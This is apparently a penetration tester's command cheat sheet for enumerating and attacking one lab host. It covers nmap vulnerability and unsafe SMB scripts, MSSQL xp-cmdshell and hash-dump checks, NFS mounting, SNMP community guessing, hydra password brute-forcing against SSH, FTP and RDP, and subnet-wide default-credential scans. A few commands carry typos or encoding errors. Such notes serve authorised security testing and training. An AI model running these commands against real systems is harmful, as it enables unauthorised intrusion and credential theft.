# First
sudo nmap -p- --min-rate=1000 -T4 -v 192.168.200.5 -Pn | tee nmap-ports
ports=$(grep ^[0-9] ./nmap-ports | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo -e "\nPorts-to-Scan:" $ports
sudo nmap -sV -sC -v -p $ports 192.168.200.5 -Pn | tee nmap-fulltcp
echo -e "\nSummary:"
grep ^[0-9] ./nmap-fulltcp

# Consider UDP (ex: snmp)
sudo nmap --top-ports 20 -sU -sV -sC -v 192.168.200.5 | tee nmap-udp20
sudo nmap -sUV -T4 -F -v --version-intensity 0 192.168.200.5 | tee nmap-udpfast
sudo nmap -p0-65535 -Pn â€“sU -v 192.168.200.5 | tee nmap-udpall

# Consider nmapAutomator
sudo nmapAutomator.sh -H 192.168.200.5 -t Script | tee nmap-auto-script
sudo nmapAutomator.sh -H 192.168.200.5 -t Vulns | tee nmap-auto-vulns
sudo nmapAutomator.sh -H 192.168.200.5 -t Recon | tee nmap-auto-recon
sudo nmapAutomator.sh -H 192.168.200.5 -t All | tee nmap-auto-all

# Vulns
nmap -Pn -v --script vuln 192.168.200.5  ..vul/cve detection, No Pings 
nmap --script safe -v -p 445 192.168.200.5

# Scripts
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
ls -l /usr/share/nmap/scripts/nfs* 

# Services
nmap -p 443 -v --script ssl-heartbleed 192.168.200.5
nmap -sU -p 69 -v --script tftp-enum.nse 192.168.200.5 
nmap -sU -p 69 -v --script tftp-enum.nse --script-args tftp-enum.filelist=windowsloot.txt 192.168.200.5
nmap -p 80 -nv --script=http-vuln-cve2010-2861 192.168.200.5  #coldfusion 
nmap -p 80 -v --script http-shellshock --script-args uri=/cgi-bin/vulnscript.sh 192.168.200.5
nmap -p 80 -v --script http-shellshock --script-args uri=/cgi-bin/admin.cgi 192.168.200.5 
nmap -p 443 -v --script ssl-heartbleed 192.168.200.5 

# NFS
nmap -sV -v --script=nfs-showmount 192.168.200.5
nmap -p 111 -v --script nfs* 192.168.200.5
nmap -p 111 -sV -v --script=rpcinfo 192.168.200.5
showmount -e 192.168.200.5
mkdir /tmp/bu 
su mount -t nfs 192.168.200.5/backups /tmp/bu 

# SMTP
nmap -pT:25 -v --script smtp-commands.nse 192.168.200.5
nmap -v -p 25,465,587 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} 192.168.200.5

# SMB
enum4linux -A 192.168.200.5
sudo nmap -p 139,445 -v --script=smb-vuln* 192.168.200.5 
sudo nmap -p 445 -v --script=smb-enum-shares,smb-enum-users 192.168.200.5 
sudo nmap -v --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 192.168.200.5 -oG nmap-smb

# MSSQL
sudo nmap -p 1433 -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV 192.168.200.5 -oG nmap-mssql 

# FTP
hydra -C $ftpbetterdefaultpasslist 192.168.200.5 ftp

# Postgres
psql -h 192.168.200.5 -U postgres -p 5437

# MySQL
nmap -p 3306 -v --script mysql-brute -T5 -nv 192.168.200.5
mysql -h 192.168.200.5 --port=3306 --user=root -p 
mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;' 

# SNMP
snmp-check 192.168.200.5  ..Favorite (TCP?)
sudo nmap -sU --open -p161 192.168.200.5
echo -e "public\nprivate\nmanager" > community.txt 
REF: danielmiessler > "common-snmp-community-strings.txt"
onesixtyone -c community.txt 192.168.200.5
snmpwalk -c public -v1 -t 10 192.168.200.5
snmpwalk -c public -v1 192.168.200.5 1.3.6.1.4.1.77.1.2.25 

# SSH
hydra -f -V -I -t 50 -l bob -P $rockyou 192.168.200.5 ssh -s 22022

# RDP
hydra -t 1 -V -f -l users.txt -P $commontenk rdp://192.168.200.5



# Default cred scan: 
changeme.py 192.168.200.5
changeme.py 192.168.200.5/24 
changeme.py nmap_subnet.xml 
changeme.py --protocols ssh,ssh_key 192.168.200.5/24 
changeme.py snmp://192.168.200.5

# Consider
mxweb mxcurls 
